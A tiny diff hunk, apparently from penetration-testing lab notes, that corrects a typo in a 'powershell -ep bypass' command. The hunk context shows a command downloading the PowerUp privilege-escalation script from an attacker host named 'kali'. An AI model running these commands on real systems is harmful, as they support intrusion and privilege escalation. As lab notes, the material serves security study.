@@ -35,7 +35,7 @@ iwr http://kali/PowerUp.ps1 -Outfile PowerUp.ps1
 ```
 
 ```
-powereshell -ep bypass
+powershell -ep bypass
 ```
 
 ```
